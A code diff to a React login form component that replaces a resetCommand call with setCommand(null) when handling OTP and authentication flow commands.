@@ -11,7 +11,7 @@ import BackgroundLoader from './BackgroundLoader'
 
 export default function LoginForm() {
     const router = useRouter()
-    let { command, resetCommand } = useCommand();
+    let { command, setCommand } = useCommand();
     const { theme, toggleTheme } = useTheme();
     const [otpCode, setOtpCode] = useState("");
     const [invalid, setInvalid] = useState(false)
@@ -32,6 +32,7 @@ export default function LoginForm() {
     function handleDisplayModal(type) {
         setModal(type);
         setDisplayModal(true); // Ensure this is called
+        setCommand(null)
         // resetCommand();
         console.log('Opening modal for:', type); // Debug log
     }
@@ -66,10 +67,12 @@ export default function LoginForm() {
         if (command === 'REQUEST_AUTH_OTP_AGAIN') {
             setIsLoading(false);
             setInvalid(true);
+            setCommand(null)
             // resetCommand(); 
         } else if (command === 'REQUEST_EMAIL_OTP_AGAIN') {
             setIsLoading(false);
             setInvalid(true);
+            setCommand(null)
             // resetCommand(); 
         } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
             setIsLoading(false);
@@ -94,10 +97,10 @@ export default function LoginForm() {
             // Only close if the modal type matches the expected OTP type
             if (modal === 'AuthApp') {
                 setDisplayModal(false);
-                resetCommand(); 
+                setCommand(null)
             } else if (modal === 'Email') {
                 setDisplayModal(false);
-                resetCommand(); 
+                setCommand(null)
             }
         } else if (command === 'FINISH') {
             setIsLoading(false);
